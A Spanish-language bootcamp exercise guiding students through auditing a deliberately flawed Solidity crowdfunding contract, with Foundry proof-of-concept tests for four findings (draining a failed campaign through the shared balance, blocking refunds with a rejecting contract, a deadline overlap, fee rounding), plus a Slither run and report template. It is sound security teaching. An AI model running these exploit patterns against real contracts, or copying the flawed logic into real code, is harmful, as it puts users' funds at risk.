# Ejercicio 02 — Hallazgos con PoC

> Al terminar habrás auditado un contrato de crowdfunding: cuatro hallazgos, cada uno con su
> prueba de concepto en Foundry, su severidad justificada y su redacción, y habrás separado lo
> que Slither ve de lo que no ve.

**Duración estimada**: 2 h
**Prerrequisitos**: [Teoría 03 — Hallazgos y severidad](../../1-teoria/03-hallazgos-y-severidad.md)
leída y el [ejercicio 01](../ejercicio-01-modelo-de-amenazas/README.md) en verde.

## Contexto

Proyecto Foundry. `Crowdfund` reúne campañas con meta y plazo. Quien aporta lo hace hasta el plazo
incluido. Si la campaña llega a su meta, su creador cobra lo recaudado menos un 2,5 % para la
plataforma; si no llega, cualquiera llama a `refundAll` y cada aportante recupera lo suyo.

| Archivo | Qué es |
| ------- | ------ |
| `src/Crowdfund.sol` | El contrato auditado, con fallos. **No lo corrijas**: el auditor prueba y explica; corrige el equipo |
| `test/PoC.t.sol` | Una PoC por hallazgo: tu trabajo, pasos 1 a 4. `test_ClaimAfterGoal` es el modelo |
| `FINDINGS.md` | Lo creas tú en el paso 6 |

Una PoC **pasa** cuando el fallo existe (teoría 03). Al revés que en el ejercicio 01: aquí el
verde quiere decir que el ataque funciona.

Antes de abrir las PoC, haz tu propia revisión: lee `Crowdfund.sol` con la tabla de preguntas de
la teoría 01 y apunta cada sospecha con su línea. Después compara tus notas con los cuatro
hallazgos.

## Paso 0: Entrar y ver el rojo

```bash
cd bootcamp/week-26-auditoria/2-practicas/ejercicio-02-hallazgos-con-poc/starter
docker run --rm -it -v "$PWD":/workspace bc-smartcontracts-dev
forge test
```

**Verifica**: `1 passed; 4 failed`. `test_ClaimAfterGoal` en verde: Carol cobra 9,75 ETH y la
plataforma 0,25. Los otros fallan con su `TODO: Paso N`.

## Paso 1: H-01, cobrar sin llegar a la meta

**Por qué**: mira la condición de `claim`: compara `address(this).balance` con la meta. El saldo
del contrato es el de **todas** las campañas. Con el ETH de la campaña de Carol dentro, la de
Mallory, que se quedó en 2 de 10 ETH, "llega" a la meta. Mallory cobra lo que debía devolverse a
Alice, y `refundAll` ya no lo devuelve porque la campaña está cerrada.

```solidity
vm.prank(carol);
uint256 honest = crowdfund.create(20 ether, deadline);
vm.prank(mallory);
uint256 failed = crowdfund.create(10 ether, deadline);
vm.prank(bob);
crowdfund.contribute{value: 20 ether}(honest);
vm.prank(alice);
crowdfund.contribute{value: 2 ether}(failed);

vm.warp(deadline);
vm.prank(mallory);
crowdfund.claim(failed);
assertEq(mallory.balance, 1.95 ether);

vm.warp(deadline + 1);
vm.expectRevert(Crowdfund.Closed.selector);
crowdfund.refundAll(failed);
```

**Abre** `test/PoC.t.sol`, borra el `revert` de `test_Paso1_PoC_ClaimWithoutReachingGoal` y
descomenta sus líneas. Ejecuta `forge test`.

**Verifica**: `2 passed; 3 failed`. Mallory tiene 1,95 ETH: los 2 de Alice menos la comisión.
Impacto alto, probabilidad alta (basta crear una campaña): **crítica**.

## Paso 2: H-02, un aportante bloquea las devoluciones

**Por qué**: `refundAll` recorre la lista de aportantes y envía a cada uno; si un envío falla,
revierte entero. `Rejecter`, al principio de `test/PoC.t.sol`, es un contrato sin `receive`:
cualquier ETH que le envíen revierte. Mallory aporta 1 wei por él, y desde entonces `refundAll`
revierte siempre. Es el DoS por envío de la semana 21.

```solidity
vm.prank(carol);
uint256 id = crowdfund.create(10 ether, deadline);
vm.prank(alice);
crowdfund.contribute{value: 5 ether}(id);
Rejecter rejecter = new Rejecter();
vm.deal(mallory, 1);
vm.prank(mallory);
rejecter.contribute{value: 1}(crowdfund, id);

vm.warp(deadline + 1);
vm.expectRevert(Crowdfund.TransferFailed.selector);
crowdfund.refundAll(id);
assertEq(alice.balance, 95 ether);
assertEq(address(crowdfund).balance, 5 ether + 1);
```

**Abre** `test/PoC.t.sol` y resuelve `test_Paso2_PoC_RejectingContributorBlocksRefunds`.

**Verifica**: `3 passed; 2 failed`. Los 5 ETH de Alice siguen en el contrato y no hay ninguna
función que los saque. Impacto alto (bloqueados para siempre), probabilidad alta (1 wei desde un
contrato): **crítica**.

## Paso 3: H-03, el segundo exacto

**Por qué**: `contribute` acepta hasta `block.timestamp <= deadline` y `claim` funciona desde
`block.timestamp >= deadline`. En el segundo exacto del plazo valen las dos. Si Carol cobra en ese
bloque y Bob aporta después, la aportación de Bob entra en una campaña cerrada: `claim` ya se usó y
`refundAll` no devuelve nada porque la meta se alcanzó.

```solidity
vm.prank(carol);
uint256 id = crowdfund.create(10 ether, deadline);
vm.prank(alice);
crowdfund.contribute{value: 10 ether}(id);

vm.warp(deadline);
vm.prank(carol);
crowdfund.claim(id);
vm.prank(bob);
crowdfund.contribute{value: 1 ether}(id);

vm.prank(carol);
vm.expectRevert(Crowdfund.Closed.selector);
crowdfund.claim(id);
vm.warp(deadline + 1);
vm.expectRevert(Crowdfund.GoalReached.selector);
crowdfund.refundAll(id);
assertEq(address(crowdfund).balance, 1 ether);
```

**Abre** `test/PoC.t.sol` y resuelve `test_Paso3_PoC_ContributionAfterClaimIsLocked`.

**Verifica**: `4 passed; 1 failed`. El 1 ETH de Bob se queda dentro. Impacto alto, pero solo pasa
en un segundo concreto y con las dos transacciones en ese orden: probabilidad baja, **media**.

## Paso 4: H-04, el redondeo de la comisión

**Por qué**: `c.raised / 10_000 * FEE_BPS` divide antes de multiplicar. La división entera tira el
resto, y la multiplicación lo agranda 250 veces (semana 22).

```solidity
uint256 raised = 1 ether + 9_999;
vm.prank(carol);
uint256 id = crowdfund.create(raised, deadline);
vm.prank(alice);
crowdfund.contribute{value: raised}(id);
vm.warp(deadline);
vm.prank(carol);
crowdfund.claim(id);

uint256 expected = raised * crowdfund.FEE_BPS() / 10_000;
assertEq(expected, 25_000_000_000_000_249);
assertEq(expected - platform.balance, 249);
```

**Abre** `test/PoC.t.sol` y resuelve `test_Paso4_PoC_FeeRoundsDown`.

**Verifica**: `5 passed; 0 failed`. Ejecuta esta PoC con traza:

```bash
forge test --mt test_Paso4_PoC_FeeRoundsDown -vvvv
```

La plataforma recibe `25000000000000000` wei en vez de `25000000000000249`. Pasa en cada cobro,
pero se pierden menos de 250 wei: impacto bajo, **baja**.

## Paso 5: Lo que ve Slither

**Por qué**: las herramientas confirman y abren pistas (teoría 01). Comparar su salida con tus
hallazgos te dice qué parte de la auditoría podía automatizarse y cuál no.

```bash
slither . --filter-paths "test|forge-std" --exclude-informational --exclude-optimization
```

**Verifica**: `10 result(s) found`. Busca en la salida:

- `divide-before-multiply` en `claim`: es H-04.
- `calls-loop` en `refundAll`: una llamada externa dentro de un bucle. Es la pista de H-02,
  aunque no dice que un solo envío fallido lo bloquea todo.
- `reentrancy-eth` en `refundAll`: un **falso positivo**. Escribe en tus notas por qué: qué está
  ya a cero o cerrado cuando se envía el ETH, y qué hace `contribute` si un aportante vuelve a
  entrar.
- Nada sobre H-01 ni H-03. ¿Por qué no puede verlos ningún detector?

## Paso 6: Escribir los hallazgos

**Por qué**: el equipo no ejecuta tus notas: lee el informe.

Crea `FINDINGS.md` junto a `foundry.toml`, con la tabla y una sección por hallazgo, en el formato
de la teoría 03:

```markdown
| Id | Título | Severidad | Estado |
| -- | ------ | --------- | ------ |
| H-01 | El creador de una campaña que no llegó a su meta cobra igual | Crítica | Abierto |
| ... | ... | ... | ... |

### H-01 — El creador de una campaña que no llegó a su meta cobra igual

- **Severidad**: crítica. Impacto: ... Probabilidad: ...
- **Descripción**: `claim` (línea ...) compara ...
- **Impacto**: ...
- **Prueba**: `test_Paso1_PoC_ClaimWithoutReachingGoal`.
- **Recomendación**: ...
- **Estado**: abierto.
```

Al final, una sección **Falsos positivos** con el `reentrancy-eth` del paso 5 y su motivo.

**Verifica**, a mano:

- Cada título dice quién hace qué y qué consecuencia tiene, sin abrir el código.
- Cada severidad separa impacto y probabilidad, y coincide con la matriz.
- Cada recomendación dice qué conseguir, no el parche entero. Para H-02, piensa en la retirada
  individual de la semana 21 (*pull over push*): que cada aportante saque lo suyo.
- Para H-03, la recomendación tiene que cerrar el solape: o `contribute` acepta hasta
  `deadline - 1`, o `claim` empieza en `deadline + 1`.

## Para pensar

- Si el equipo corrige H-01 comparando con `c.raised`, ¿qué tiene que pasarle a tu PoC? ¿Y qué
  test nuevo debería escribir el equipo?
- ¿H-02 y H-03 son la misma causa raíz? ¿Por qué no?

---

| Anterior | Actual | Siguiente |
| -------- | ------ | --------- |
| [← Ejercicio 01 — Modelo de amenazas](../ejercicio-01-modelo-de-amenazas/README.md) | **Ejercicio 02 — Hallazgos con PoC** | [Ejercicio 03 — CTF local →](../ejercicio-03-ctf-local/README.md) |
